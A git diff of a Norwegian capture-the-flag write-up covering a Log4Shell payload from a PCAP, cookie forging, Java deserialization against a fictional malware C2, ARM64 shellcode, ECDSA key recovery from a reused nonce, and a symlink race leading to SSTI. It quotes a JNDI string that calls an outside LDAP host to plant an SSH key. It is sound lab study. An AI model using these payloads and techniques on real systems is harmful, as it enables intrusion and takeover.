@@ -14,7 +14,7 @@ Denne writeup'en tar for seg oppdraget. Konteksten rundt oppdraget vil du finne 
 Vi har mottatt ei [PCAP-fil](context/COMPROMISE_PWR-WS-CAF5DB.pcap) med nettverkstraffik fra angrepet.
 Når vi åpner den i Wireshark er det en HTTP pakke som skiller seg ut:
 
-```bash
+```text
 GET / HTTP/1.1
 Host: pwr-07-ws-caf5db
 Accept: */*
@@ -22,7 +22,7 @@ X-Flag: caf5db3e4479b9c3dcb91e43ef9aa497
 User-Agent: ${jndi:ldap://10.0.30.98:1389/Basic/Command/Base64/ZWNobyBzc2gtZWQyNTUxOSBBQUFBQzNOemFDMWxaREkxTlRFNUFBQUFJTVRnYnlrZW1wZEFaNEZhaHpMUit0c2NrdFNsaUt0RWR3Wk9sWllXQkhxQyA%2bPiAuc3NoL2F1dGhvcml6ZWRfa2V5cw==}
 ```
 
-Den inneholder både et flagg og en indikator på en utnyttelse av en Log4J-svakhet. Vi kommer tilbake til sistnevnte på 2.06.
+Den inneholder både et flagg og en indikator på en utnyttelse av en Log4J-svakhet. Vi kommer tilbake til sistnevnte for 2.06.
 
 ```text
 Kategori: 2. Oppdrag
@@ -38,7 +38,7 @@ Gratulerer, korrekt svar!
 ## 2.02_anvilnotes
 
 [INTREP](context/INTREP.txt) gir oss en pekepinne mot en nettside som kan nås på ANVILNOTES.CYBERTALENT.NO.
-Dette fremstår som en helt vanlig nettside hvor man kan lage bruker, logge inn og lagre notater i skyen.
+Dette fremstår som en helt vanlig nettside hvor man kan lage bruker, logge inn, og lagre notater i skyen.
 
 Om vi lager en testbruker og lager et notat, så kan vi se at hvert notat får en mangesifret unik ID. 
 Utifra dette begynte jeg å se etter *Insecure Direct Object References* (IDOR), og kom frem til at https://anvilnotes.cybertalent.no/note/1 gir oss tilgang til et notat skrevet av admin. 
@@ -73,7 +73,7 @@ Gir dette noen hint til hvordan du kan få mer tilgang?
 I notatene til admin står følgende:
 `☐ Secure flask token using military grade encryptions that can't be unsigned using open software.`
 
-Basert på det, så googlet jeg følgende: `flask token exploit github`.
+Basert på det, så googlet jeg `flask token exploit github`.
 Da fikk jeg opp denne som fjerdevalg: https://github.com/Paradoxis/Flask-Unsign
 
 Bruken av verktøyet er ganske rett frem, og hvordan/hvorfor det funker står best forklart på GitHub'en.
@@ -253,10 +253,8 @@ Backup of client source code
 Backup of server source code
 ```
 
-Flagget ligger i notatene, sammen med den Base-64-kodet kildekoden til C2-klienten/-serveren.
+Flagget ligger i notatene, sammen med den Base-64-kodet kildekoden for klienten/serveren til skadevaren.
 Jeg brukte [denne](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()Untar()) oppskriften i Cyberchef for å pakke den ut.
-
-Koden ligger [her](context/c2_source_code/), og den kommer vi tilbake til i [2.09](#209_cloud-hq).
 
 ```text
 Kategori: 2. Oppdrag
@@ -432,13 +430,17 @@ Den test-instansen som fortsatt sjekker inn så spennende ut...
 Nå har vi tilgang til både `archive@shady-aggregator` og kildekoden for skadevaren som er i bruk. Scoreboard-teksten til 2.08 hinter mot den `test-3` instansen som sjekker inn hvert 10. sekund.
 
 Det mest logiske er at det er en sårbarhet i skadevaren som vil gi oss tilgang til de som opererer skadevaren.
-Dette fant jeg ikke med det første, så gravde meg ned i et kaninhull som endte med at jeg fikk tilgang til c2-brukeren på shady-aggregator, som var et flagg i umulig-kategorien. Det var gjennom en race condition -> SSTI, og gjennomgangen ligger [nederst](#3413_shady-aggregator_c2).
+Dette fant jeg ikke med det første, så gravde meg ned i et kaninhull som endte med at jeg fikk tilgang til `c2`-brukeren på `shady-aggregator`, som var et flagg i umulig-kategorien. Det var gjennom en race condition -> SSTI, og gjennomgangen ligger [nederst](#3413_shady-aggregator_c2).
 
 Men selv tilgang til brukeren som kjørte serveren var ikke det som måtte til for å få tilgang til skurkene. Hver en kommando som blir lastet opp og ned går gjennom en ECDSA signatursjekk, og implementasjonen virket nokså plettfri både på serveren og klienten i mine øyne.
 
 Etter mye leting på nettet kom jeg over en sårbarhetskategori som heter Java Deserialization. Etter mange timers lesing gjennom slides og whitepapers på [denne](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#overview) GitHub'en så forstod jeg litt hvordan sårbarheten fungerte, og hvordan den kunne anvendes i denne situasjonen.
 
-I Config.java er det en `readObject()` funksjon som håndterer hvordan et Config-objekt skal leses inn.
+I Config.java er det en `readObject()` metode som håndterer hvordan et Config-objekt skal leses inn. 
+
+`readObject()` er en standardmetode som er tilgjengelig i alle objekter som implementerer interfacet Serializable, men den kan også defineres manuelt av utvikleren. 
+Dette kan være nyttig for å implementere ytterligere logikk for gjenoppretting av objekter.
+
 I denne ser vi at den går gjennom alle `pendingCommands`, og kjører de hvis tiden er inne. Dette skjer da altså uten noe som helst verifikasjon gjennom ECDSA.
 
 ```java
@@ -505,7 +507,7 @@ public static void main(String[] args) {
 ```
 
 Dette gir oss `malicious_config`, som vi skal bruke videre.
-Gjorde et par endringer til mens jeg lekte meg. Disse påvirker ikke oppdraget, men du finner de [her](c2_scripts/modified_client_source).
+Gjorde et par endringer til mens jeg prøvde å forstå meg på objektene som ble benyttet i skadevaren. Disse påvirker ikke oppdraget, men du finner de [her](c2_scripts/modified_client_source).
 
 Neste steg var å legge til objektet i kommando-databasen til c2-serveren, slik at `test-3` klienten hentet det under neste innsjekk. Heldigvis hadde jeg direkte tilgang til sqlite3 databasen gjennom `c2` brukeren, så denne problemstillingen slapp jeg å tenke på. :innocent: Lagde et [skript](c2_scripts/add_command_to_db.py) for å gjøre dette.
 
@@ -573,7 +575,7 @@ Ny fil: /home/login/2_oppdrag/INTREP-2.txt
 
 ## 2.11_aurum_shell
 
-Vi bruker samme utnyttelse som for 2.09, men bytter ut ID'en til aurum sin.
+Vi bruker samme utnyttelse som for 2.09, men bytter ut ID'en til `aurum` sin.
 Flagget ligger godt synlig i hjemmemappen.
 
 ```text
@@ -735,8 +737,6 @@ Ny fil: /home/login/2_oppdrag/worst_case_scenario.jpg
 
 ## 2.13_findflag
 
-Jeg reverse engineeret `/usr/bin/konekt`, og fant ut at den fungerte som en wrapper for en tjeneste som kjørte på serveren `mad`, port 1337.
-
 `konekt` tillater oss å laste ned firmware som ligger på serveren. Dette er filene som ligger der fra før:
 
 ```text
@@ -751,7 +751,9 @@ Jeg reverse engineeret `/usr/bin/konekt`, og fant ut at den fungerte som en wrap
 ```
 
 Om vi laster ned og pakker ut `server-software.tar.xz`, så får vi ei binærfil som heter `fracture`. 
-Dette er programvaren som kjører på `mad`. Planen er å reversere denne, og finne en måte å elevere privilegiet vårt. Jeg brukte Ghidra til dette.
+Dette er programvaren som kjører på `mad`. 
+
+Planen er å reversere denne, og finne en måte å elevere privilegiet vårt. Jeg brukte Ghidra til dette.
 
 I funksjonen `ui_read_key()` finner vi følgende:
 
@@ -771,7 +773,8 @@ Lettere sagt: de siste 8 karakterene vi har skrevet inn er lagret i `_history.0`
 `0x726f6f646b636162` er hex for `roodkcab`, som er backdoor baklengs.
 Når `_history.0` inneholder den verdien, så blir privilegiet vår forhøyet til `Developer`.
 
-Nå som vi er `Developer` har vi tilgang til å rename brukeren vår. Grunnet feil i programvare (som vil ta litt for mye tid å forklare), så får vi `SYSTEM` privilegier om vi kaller oss noe som ikke er alfanumerisk. Jeg brukte "!".
+Nå som vi er `Developer` har vi tilgang til å rename brukeren vår. Grunnet feil i programvare (som er lett å utnytte, men vanskelig å forklare), så får vi `SYSTEM` privilegier om vi kaller oss noe som ikke er alfanumerisk. 
+Jeg brukte `!`.
 
 Vi er nå priviligert nok til å kjøre programmer, og når vi kjører `findflag.prg` får vi opp et flott bilde:
 
@@ -891,9 +894,17 @@ cat b.txt_signed | hd
 # 00000040  95 b3 f6 b3 fe 63 76 00  2a ec 4b ee 1b 5e 6a 0f  |.....cv.*.K..^j.|
 ```
 
-`r` har samme verdi over flere signeringer. Dette er veldig dårlig kryptografimessig, men veldig bra for oss. `r = k * G`, hvor `k` er tiltenkt å være en tilfeldig verdi hver gang. Siden den er statisk er det mulig for oss å regne ut privatnøkkelen.
+En ECDSA-signatur består vanligvis av `r` og `s`, som hver er 32 bytes:
 
-Jeg prøvde å reverse engineere `signer` for å finne ut hvorfor dette skjedde, men det ga meg ingenting (bortsett fra redusert livsgnist av å måtte reversere kompilert Rust-kode).
+```c
+struct ECDSA_Signature {
+    uint32_t r;
+    uint32_t s;
+};
+```
+Vi kan se at `r` har samme verdi over flere signeringer. Dette er veldig dårlig kryptografimessig, men veldig bra for oss. `r = k * G`, hvor `k` er tiltenkt å være en tilfeldig verdi hver gang. Siden den er statisk er det mulig for oss å regne ut privatnøkkelen.
+
+Jeg prøvde å reverse-engineere `signer` for å finne ut hvorfor dette skjedde, men det ga meg ingenting (bortsett fra redusert livsgnist av å måtte reversere kompilert Rust-kode).
 
 Lastet ned `missile.1.3.37.fw` og sammenlignet signaturen med `test.txt_signed` for å sjekke om det samme fenomenet hadde skjedd ved den tidligere signeringen:
 
@@ -943,8 +954,10 @@ Dette ser ut til å være privatnøkkelen som de bruker i ECDSA-signeringen sin.
 
 ## 2.15_firmware_staged
 
+Med litt reversering av `/usr/bin/konekt` fant man fort ut at det bare var en wrapper for å kommunisere med en tjeneste som kjørte på serveren `mad`, port 1337.
+
 Jeg lagde [4 skript](konekt_scripts/) for å interagere med `mad:1337` via Python sockets. Dette tok tiden for å laste opp/ned filer fra flere minutter ned til noen sekunder. 
-Jeg kunne også lett kopiere og lime inn shellcoden som jeg genererte på min lokale maskin til aurum. Dette gjorde feilsøkingen/krasjingen av shellcoden mye raskere.
+Jeg kunne også lett kopiere og lime inn shellcoden som jeg genererte på min lokale maskin til `aurum`. Dette gjorde feilsøkingen/krasjingen av shellcoden mye raskere.
 
 I kildekoden til `fracture` finner vi denne interessante funksjonen:
 
@@ -995,9 +1008,9 @@ Siden vi kan kjøre hvilken som helst kode i konteksten av `fracture` så kan jo
 
 Ett problem er at den forventer `ARM64` instruksjonssettet, kontra `x86_64` som vi vanlige dødlige er vant med. Jeg har aldri rørt ARM64 før. Den eneste erfaringen jeg har med det er via en kompis som måtte jobbe med det, og han nevnte at han "*savnet vanlig assembly*".
 
-Heldigvis er årstallet 2022/23. Smarte individer har gjort mye bra arbeid. Spesielt de som har laget `shellcraft`-modulen til `pwntools`.
+Heldigvis er årstallet 2022/23. Smarte individer har gjort mye bra arbeid. Spesielt de som har laget `shellcraft`-modulen til `pwntools`. Med `shellcraft` er det å lage shellcode for de fleste instruksjonssett nesten like enkelt som å skrive C-kode. 
 
-Med `shellcraft` er det å lage shellcode nesten like enkelt som å skrive C-kode. Vi ønsker da å sende en tilfeldig kommando til `localhost:1025`, og se hva vi får tilbake:
+Vi ønsker da å sende en tilfeldig kommando til `localhost:1025`, og se hva vi får tilbake:
 
 ```python
 from pwn import *
@@ -1037,7 +1050,9 @@ python3 upload_and_run.py 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080
 #         response: text
 ```
 
-I kildekoden til `fracture` ser vi tilfeller hvor `list` og `tele` blir brukt. 
+Den forstod ikke kommandoen den ble tilsendt, så den svarte med en generisk hjelp-meny. 
+
+I kildekoden til `fracture` ser vi tilfeller hvor `list` og `tele` blir brukt.
 `ping` er akkurat like simpel som den virker, så vi står igjen med `flsh`.
 
 Vi har et valg om å oppdatere firmwaren til missilene gjennom `konekt`, men dette feiler da den ikke finner `flash.prg`:
@@ -1146,7 +1161,7 @@ python3 upload_and_run.py 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080
 # [+] FLAG: 7f34ada436059e84fea23eb48c91024c9203638b
 ```
 
-Hurra! Etter litt testing var en `nanesleep` på ett sekund for lite til å fullføre hver gang, men to sekunder var midt i blinken.
+Hurra! Litt testing tilsa at en `nanosleep` på ett sekund for lite til å fullføre hver gang, men to sekunder var midt i blinken.
 
 ```text
 Kategori: 2. Oppdrag
@@ -1154,7 +1169,8 @@ Oppgave:  2.15_firmware_staged
 Svar:     7f34ada436059e84fea23eb48c91024c9203638b
 Poeng:    5
 
-Wow! Firmware staged for flash når ubåten dykker opp! Oppdragsgiver ønsker at vi skal manipulere målkoordinatene til å treffe et trygt sted (24.1851, -43.3704). Klarer du dette? Analytikerene våre indikerer at ubåt nr. 1 sannsynligvis vil dykke opp i Biscayabukta, ubåt nr. 2 mellom Island og de Britiske øyer, ubåt nr. 3 ca. 100-200 nm sør/sør-øst for Italia, ubåt nr. 4 ca. 300-500 nm sør/sør-vest for Irland, og ubåt nr. 5 ca. 200-400 nm vest for Portugal. Bruk denne informasjonen for å regne ut de parametere du trenger.
+Wow! Firmware staged for flash når ubåten dykker opp! Oppdragsgiver ønsker at vi skal manipulere målkoordinatene til å treffe et trygt sted (24.1851, -43.3704). Klarer du dette? Firmwaren ser ut til å være beskyttet av en form for signatursjekk. Hvis du klarer å finne en måte å bestå denne sjekken på så kan du levere det du finner med `scoreboard FUNN` for en liten påskjønnelse, hvis du ikke allerede har gjort det.
+Analytikerene våre indikerer at ubåt nr. 1 sannsynligvis vil dykke opp i Biscayabukta, ubåt nr. 2 mellom Island og de Britiske øyer, ubåt nr. 3 ca. 100-200 nm sør/sør-øst for Italia, ubåt nr. 4 ca. 300-500 nm sør/sør-vest for Irland, og ubåt nr. 5 ca. 200-400 nm vest for Portugal. Bruk denne informasjonen for å regne ut de parametere du trenger.
 Siden alle missilene i hver ubåt skal til samme mål, må firmware være identisk for hvert missil per ubåt.
 ```
 
@@ -1164,7 +1180,8 @@ Siden alle missilene i hver ubåt skal til samme mål, må firmware være identi
 
 Her ble det litt vanskelig.
 
-Jeg brukte igjen Ghidra for å reverse-engineere, da IDA kun støtter ARM om man er søkkrik.
+Jeg begynte med å reverse-engineere `missile.1.3.37.fw`, som er en ELF 32-bit ARM binærfil.
+Jeg brukte igjen Ghidra, da IDA kun støtter ARM om man er søkkrik.
 
 I funksjonen `boot_banner()` kan vi se følgende:
 
@@ -1177,7 +1194,7 @@ Zephyr OS er et real-time operativsystem laget for innebygde enheter, og best av
 Jeg brukte en god stund på å navigere den dekompilerte koden, og stirret i timesvis på de forskjellige funksjonene til de ga noenlunde mening.
 
 I "Memory Map"-visningen i Ghidra kan vi se et minnesegment som heter `.rocket_parameters`. 
-Innunder denne finner vi etikettene `_tof` og `_target`. Disse navnene er vi bekjent med fra missil-listen vi fikk i [2.12_missile_targets](#212_missile_targets).
+Innunder denne finner vi etikettene `_tof` og `_target`. Disse navnene er vi bekjent med fra missil-listen vi fikk i [2.12](#212_missile_targets).
 `tof` er *Time of Flight*, altså flytiden. Begge disse to blir aksessert fra `armed_entry()`, mer spesifikt disse linjene av kode:
 
 ```C
@@ -1302,9 +1319,11 @@ Kan ikke anbefales.
 
 Prøvde å lese meg opp på rakettforskning og hvordan tid, fart og flybanen til ballistiske missiler regnes ut, men det var komplisert. 
 Kom frem til at beste måten å løse problemet på var å "observere" hva flytiden burde være, istedenfor å kalkulere den. 
-Jeg hadde jo tross alt tilgang til dataen til 80 missiler hvor dette allerede var kalkulert.
+Jeg hadde jo tross alt tilgang til dataen for 80 missiler hvor dette allerede var kalkulert.
 
-Jeg lagde et [skript](missile_scripts/missile_data_fun.py) for å regne ut distansen mellom hver ubåt og dens respektive missilers mål, i tillegg til sammenhengen mellom distanse og flytiden:
+De eksakte lat/lon koordinatene til ubåtene kunne man observere under simuleringen, så jeg slapp å approksimere disse ut ifra beskrivelsen gitt av oppdragsgiver.
+
+Jeg lagde et [skript](missile_scripts/missile_data_fun.py) for å regne ut distansen mellom hver ubåt og dens respektive missilers mål, i tillegg til sammenhengen mellom distanse og flytiden.
 
 ```text
 Distance: 348395.48975179956 - Time of Flight: 500.0 - Distance/TOF: 696.7909795035991
@@ -1516,31 +1535,45 @@ def add_command(client_id):
         except:
             print("invalid command or signature")
             return Response("", 400)
+
+
+def add_command_to_db(client_id, run_after, command_path):
+    with get_db() as db, open(command_path, "rb") as f:
+        db.execute(
+            """
+            INSERT INTO commands (client, run_after, content)
+            VALUES (?,?,?)
+            ON CONFLICT(client, run_after)
+            DO UPDATE SET content=excluded.content, delivered=FALSE
+            """,
+            (client_id, run_after, f.read()),
+        )
 ```
 
 Den første er `upload_file.save(command_file)`, som lagrer innholdet vi sender til serveren til et tilfeldig navn som den får fra `tempfile.NamedTemporaryFile`.
 
-Den andre er `add_command_to_db`, hvor den åpner filnavnet vi fikk fra `tempfile.NamedTemporaryFile`, leser innholdet, og skriver det inn i databasen. Dette skjer kun hvis filen som blir sendt består `obj.verify`-sjekken.
+Den andre er i `add_command_to_db`, hvor den åpner filnavnet vi fikk fra `tempfile.NamedTemporaryFile`, leser innholdet, og skriver det inn i databasen. Dette skjer kun hvis filen som blir sendt består `obj.verify`-sjekken. Når filen er lest inn kan vi lese den ut ved å sende rett forespørsel til webserveren.
 
-Vi har da i teorien et utnyttelsesprimitiv for både lesing og skriving av filer.
 
 Merk også at `WORKSPACE` er satt til å være `/tmp/.../`, som er et filområde som vi har full tilgang til.
 
-Tanken var da å bruke Python til å konstant lese etter nye filer i `/tmp/.../`, og erstatte filen med en symbolisk kobling til en fil som vi bestemmer.
+Tanken var da å bruke Python til å konstant lese etter nye filer i `/tmp/.../`, og erstatte filen med en gang den dukket opp med en symbolisk kobling til en fil som vi bestemmer.
+Vi har da i teorien et utnyttelsesprimitiv for både lesing og skriving av filer, basert på timingen.
 
-På et moderne, vanlig system så vil denne typen utnyttelser gjennom symbolske linker i `world-writable directories` ikke fungere grunnet denne kjernebeskyttelsen: https://sysctl-explorer.net/fs/protected_symlinks/. 
-Denne beskyttelsen har stoppet meg flere ganger tidligere, men jeg er dum/dedikert nok til å bruke et flersifret antall timer på dette *just in case*.
+På et moderne, vanlig system så vil denne typen utnyttelser gjennom symbolske koblinger i `world-writable directories` ikke fungere grunnet denne kjernebeskyttelsen: https://sysctl-explorer.net/fs/protected_symlinks/. 
+Denne beskyttelsen har stoppet meg flere ganger tidligere, men jeg er dum/dedikert nok til å bruke et flersifret antall timer på dette *just in case*. :)
 
-For å teste om vårt utnyttelsesprimitiv kan følge symbolske linker utenfor `/tmp`, så gjorde jeg et lite forsøk:
+For å teste om våre utnyttelsesprimitiv kan følge symbolske koblinger utenfor `/tmp`, så gjorde jeg et lite forsøk. 
+Før jeg kjørte dette skriptet gjorde jeg en `chmod 777 -R /home/archive`
 
-Dette skriptet kjørte jeg lokalt på `shady-aggregator`:
+Jeg kjørte følgende skript på `shady-aggregator`, etter å ha gjort hjemmemappen til `archive` tilgjengelig for alle (`chmod 777 -R /home/archive`):
 
 ```python
+# race.py
 import os
 import time
 import sys
 
-# Før jeg kjørte dette skriptet gjorde jeg en `chmod 777 -R /home/archive` :)
 
 def main():
 
@@ -1579,6 +1612,7 @@ if __name__ == "__main__":
 Dette kjørte jeg fra `corax`:
 
 ```python
+# requester.py
 import time
 import sys
 import requests
@@ -1598,9 +1632,9 @@ Dette betyr enten at den beskyttelsen jeg nevnte er avskrudd, eller at noe annet
 Hvem vet, datamaskiner er rare.
 
 Dette var utnyttelsen av skrive-primitivet vårt. 
-Lese-primitivet er ganske likt, bortsett fra litt forskjellig timing i det lokale `race`-skriptet, og at `requester.py` i tillegg må lese tilbake innholdet som blir lagt inn i databasen og lese tilbake dette.
+Lese-primitivet er ganske likt, bortsett fra litt forskjellig timing i `race.py`, og at `requester.py` i tillegg må lese tilbake innholdet som blir lagt inn i databasen.
 
-For å teste hvor lang `sleep()` måtte være så satte jeg opp en egen versjon av serveren på en privat maskin hvor jeg hadde lagt til debug-output som viste hvor lang tid de forskjellige operasjonene brukte:
+For å teste hvor lang `sleep` måtte være så satte jeg opp en egen versjon av serveren på en privat maskin hvor jeg hadde lagt til debug-output som viste hvor lang tid de forskjellige operasjonene brukte:
 
 ```python
 @app.route(PREFIX + "<client_id>/commands", methods=["POST"])
@@ -1631,9 +1665,11 @@ def add_command(client_id):
             return Response("", 400)
 ```
 
-Jeg endte da med fungerende lese-/skrive-primitiver, men hvordan kan vi bruke disse for å få tilgang til `c2` brukeren som kjører serveren?
+De endelige `sleep`-verdiene finner du i skriptene [her](c2_scripts/racing).
 
-Jeg brukte mye tid på dette. Alt fra å prøve å skrive en `authorized_hosts` fil til `.ssh/` eller å erstatte `main.py` med en versjon som hadde en bakdør implementert.
+Vi har da fungerende lese-/skrive-primitiver, men hvordan kan vi bruke disse for å få tilgang til `c2` brukeren som kjører serveren?
+
+Jeg brukte mye tid på dette. Alt fra å prøve å skrive en `authorized_hosts` fil til `~/.ssh/`, eller å erstatte `main.py` med en versjon som hadde en bakdør implementert.
 
 Dette funket da ikke siden `c2` brukeren ikke hadde en `.ssh/` mappe, og `main.py` lå i en mappe med et navn som jeg ikke visste om.
 
@@ -1641,7 +1677,7 @@ Jeg fokuserte da på filene som lå i `template/`. Om vi kunne overskrive disse 
 
 Mappen som `main.py` kjørte i kunne jeg aksessere gjennom `/proc/self/cwd/`. Gjennom denne kunne vi lett nå `/template`. "*Hvorfor brukte du ikke dette for å overskrive `main.py`?*" spør du kanskje. Jeg vet ikke. Jeg er uperfekt og glemmer ting.
 
-Uansett, jeg fulgte stegene i [denne](https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e) nettsiden for å få et reverse shell gjennom SSTI:
+Uansett, jeg fulgte stegene i [denne](https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e) nettsiden for å komme frem til nyttelasten som kunne gi meg et reverse shell gjennom SSTI. De endelige Python-skriptene finner du [her](c2_scripts/racing):
 
 ```bash
 # På corax:
